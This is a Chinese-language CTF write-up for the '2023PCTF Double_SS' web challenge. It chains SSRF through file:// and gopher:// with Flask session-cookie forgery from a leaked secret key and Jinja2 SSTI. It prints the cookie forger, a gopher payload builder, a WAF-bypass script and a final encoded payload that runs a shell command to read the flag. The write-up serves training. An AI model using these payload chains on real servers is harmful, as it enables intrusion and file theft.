# 2023PCTF Double_SS

记录一下ssrf配合 ssti的结合

首先开启环境 明显的ssrf



<img src="https://i-blog.csdnimg.cn/blog_migrate/9e639470def70a452d3b4667bd8cd78e.png" alt="" style="max-height:338px; box-sizing:content-box;" />


让我们访问 5555端口

使用http协议访问

```cobol
url=127.0.0.1:5555
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/2f2d9cd93f1f4eafb863e9b6044ecfc3.png" alt="" style="max-height:119px; box-sizing:content-box;" />


告诉我们去访问 name 并且给我们key

```cobol
url=127.0.0.1:5555/name
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/59695bcf8a146e2fc5709709e5c5ab6a.png" alt="" style="max-height:469px; box-sizing:content-box;" />


出现报错 说我们不是admin

然后我们往下看



<img src="https://i-blog.csdnimg.cn/blog_migrate/3e27fe1d8166f56e10e6107944d0bf63.png" alt="" style="max-height:372px; box-sizing:content-box;" />


我们使用file协议读取app/app.py

```cobol
url=file:///app/app.py
```

然后美化一下

```python
from flask import Flask, request, session, render_template_string
from flask import redirect, url_for
import uuid
 
app = Flask(__name__)
app.config['SECRET_KEY'] = str(uuid.uuid4())
 
@app.route('/', methods=['GET'])
def index():
    res = '''
    You must be the admin to access the /name to SSTI using parameterme
    This is your key {}
    '''.format(app.config['SECRET_KEY'])
    return res
 
@app.route('/name', methods=['GET'])
def render():
    if session.get('admin') != True:
        return "You must be the admin"
 
    black_list = ['class', '__global__', 'os', 'popen', 'cat', 'flag', '__init__', 'eval', 'exec', 'bases']
    name = request.args.get('name')
 
    for item in black_list:
        if item in name:
            return "绕一下nya"
 
    html_str = '''
    <p>{0}</p>
    '''.format(name)
 
    return render_template_string(html_str, autoescape=True)
 
if __name__ == '__main__':
    app.debug = True
    app.run('127.0.0.1', 5555)
```

查看代码 发现这里存在一个session的鉴权

需要admin的值为1

然后就开始查看资料

发现flask可以通过secret_key 伪造admin

使用下面的代码

```cobol
#!/usr/bin/env python3
""" Flask Session Cookie Decoder/Encoder """
__author__ = 'Wilson Sumanang, Alexandre ZANNI'
 
# standard imports
import sys
import zlib
from itsdangerous import base64_decode
import ast
 
# Abstract Base Classes (PEP 3119)
if sys.version_info[0] < 3: # < 3.0
    raise Exception('Must be using at least Python 3')
elif sys.version_info[0] == 3 and sys.version_info[1] < 4: # >= 3.0 && < 3.4
    from abc import ABCMeta, abstractmethod
else: # > 3.4
    from abc import ABC, abstractmethod
 
# Lib for argument parsing
import argparse
 
# external Imports
from flask.sessions import SecureCookieSessionInterface
 
class MockApp(object):
 
    def __init__(self, secret_key):
        self.secret_key = secret_key
 
 
if sys.version_info[0] == 3 and sys.version_info[1] < 4: # >= 3.0 && < 3.4
    class FSCM(metaclass=ABCMeta):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)
 
                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)
 
                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e
 
 
        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if(secret_key==None):
                    compressed = False
                    payload = session_cookie_value
 
                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]
 
                    data = payload.split(".")[0]
 
                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)
 
                    return data
                else:
                    app = MockApp(secret_key)
 
                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)
 
                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e
else: # > 3.4
    class FSCM(ABC):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)
 
                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)
 
                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e
 
 
        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if(secret_key==None):
                    compressed = False
                    payload = session_cookie_value
 
                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]
 
                    data = payload.split(".")[0]
 
                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)
 
                    return data
                else:
                    app = MockApp(secret_key)
 
                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)
 
                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e
 
 
if __name__ == "__main__":
    # Args are only relevant for __main__ usage
    
    ## Description for help
    parser = argparse.ArgumentParser(
                description='Flask Session Cookie Decoder/Encoder',
                epilog="Author : Wilson Sumanang, Alexandre ZANNI")
 
    ## prepare sub commands
    subparsers = parser.add_subparsers(help='sub-command help', dest='subcommand')
 
    ## create the parser for the encode command
    parser_encode = subparsers.add_parser('encode', help='encode')
    parser_encode.add_argument('-s', '--secret-key', metavar='<string>',
                                help='Secret key', required=True)
    parser_encode.add_argument('-t', '--cookie-structure', metavar='<string>',
                                help='Session cookie structure', required=True)
 
    ## create the parser for the decode command
    parser_decode = subparsers.add_parser('decode', help='decode')
    parser_decode.add_argument('-s', '--secret-key', metavar='<string>',
                                help='Secret key', required=False)
    parser_decode.add_argument('-c', '--cookie-value', metavar='<string>',
                                help='Session cookie value', required=True)
 
    ## get args
    args = parser.parse_args()
 
    ## find the option chosen
    if(args.subcommand == 'encode'):
        if(args.secret_key is not None and args.cookie_structure is not None):
            print(FSCM.encode(args.secret_key, args.cookie_structure))
    elif(args.subcommand == 'decode'):
        if(args.secret_key is not None and args.cookie_value is not None):
            print(FSCM.decode(args.cookie_value,args.secret_key))
        elif(args.cookie_value is not None):
            print(FSCM.decode(args.cookie_value))
 
```

这里有个问题

网上找到的wp都是存在cookie

但是这道题目没有 所以我们直接构造

```cobol
{'admin':1}
 
这里这样写是因为 app.py中只需要 admin=true 所以 admin:1 就是 admin true
```

然后使用工具

```cobol
py3 .\flask_session.py encode -s "a71ad490-8d8f-469a-a513-b41a3884ad85" -t "{'admin':1}"
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/70557da153cab139fa266a23fadf5b45.png" alt="" style="max-height:131px; box-sizing:content-box;" />


获取到了session

然后这里继续需要 gopher协议传输

```python
import urllib.parse
 
payload = \
    """GET /name? HTTP/1.1
Host: 127.0.0.1:5555
Cookie: session=eyJhZG1pbiI6MX0.ZXFAYA.V2buNLWHOmXiO9dX08lZHgpd5Bk

    """
 
# 注意后面一定要有回车，回车结尾表示http请求结束
tmp = urllib.parse.quote(payload)
# print(tmp)
new = tmp.replace('%0A', '%0D%0A')
# print(new)
result = 'gopher://127.0.0.1:5555/' + '_' + new
result = urllib.parse.quote(result)
print(result)  # 这里因为是GET请求所以要进行两次url编码
 
```

执行

```cobol
url=gopher%3A//127.0.0.1%3A5555/_GET%2520/name%253F%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A5555%250D%250ACookie%253A%2520session%253DeyJhZG1pbiI6MX0.ZXEt5Q.1iVKmm6xuIGThpY06HKmmFWqj3Y%250D%250A%250D%250A%2520%2520%2520%2520
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/445bdd9c715ab475c4ab8b25641a6622.png" alt="" style="max-height:641px; box-sizing:content-box;" />


出现了 typeerror 这里的报错 通过翻译就可以发现是没有值的迭代

```kotlin
 
    for item in black_list:
        if item in name:
            return "绕一下nya"
```

就是这里 因为我们没有传入name 所以这里是没有值的 我们可以开始测试ssti了



<img src="https://i-blog.csdnimg.cn/blog_migrate/783a89e65f3f62ac25b7491db177c51f.png" alt="" style="max-height:437px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/31907a3e507aa439fae730d9783e3d0f.png" alt="" style="max-height:190px; box-sizing:content-box;" />


存在 然后这里我们看app.py存在waf 但是其实有一个工具直接绕过

 [GitHub - Marven11/Fenjing: 专为CTF设计的Jinja2 SSTI全自动绕WAF脚本 | A Jinja2 SSTI cracker for bypassing WAF](https://github.com/Marven11/FenJing) 

但是这里是存在处理的我们如何执行呢 工具给我们了一个pyhton脚本

```python
from fenjing import exec_cmd_payload, config_payload
import logging
logging.basicConfig(level = logging.INFO)
 
def waf(s: str): # 如果字符串s可以通过waf则返回True, 否则返回False
    blacklist = [
        'class', '__global__', 'os', 'popen', 'cat', 'flag', '__init__', 'eval', 'exec', 'bases',"\\x6f\\x73","\\u006f\\u0073","\\157\\163"  #这里替换为过滤的内容
    ]
    return all(word not in s for word in blacklist)
 
if __name__ == "__main__":
    shell_payload, _ = exec_cmd_payload(waf, "ls%20/")  #需要url编码特殊符号
    #config_payload = config_payload(waf)
 
    print(f"{shell_payload}")
    #print(f"{config_payload}")
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ff0ef6a9057e74ce0210afffc1f9b332.png" alt="" style="max-height:244px; box-sizing:content-box;" />


发现 可以输出没被过滤的payload



<img src="https://i-blog.csdnimg.cn/blog_migrate/0e91c2dde45a43dcfb12ff738cc9fa53.png" alt="" style="max-height:477px; box-sizing:content-box;" />


直接写入 然后打即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/c53051f081cf9c1cbe4cc33a3ef1b717.png" alt="" style="max-height:160px; box-sizing:content-box;" />


这里发现flag 但是cat被过滤

rce的其他方法都可以

这里选择 nl%20/f*

```cobol
gopher%3A//127.0.0.1%3A5555/_GET%2520/name%253Fname%253D%257B%257B%2528%2528lipsum.__globals__.__builtins__.__import__%2528%2527so%2527%255B%253A%253A-1%255D%2529%255B%2527p%2527%2527open%2527%255D%2528%2527nl%252520/f%252A%2527%2529%2529.read%2528%2529%2529%257D%257D%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A5555%250D%250ACookie%253A%2520session%253DeyJhZG1pbiI6MX0.ZXFAYA.V2buNLWHOmXiO9dX08lZHgpd5Bk%250D%250A%250D%250A%2520%2520%2520%2520
```

这道题挺有意思的 组合拳 主要是你伪造 session需要知道如何伪造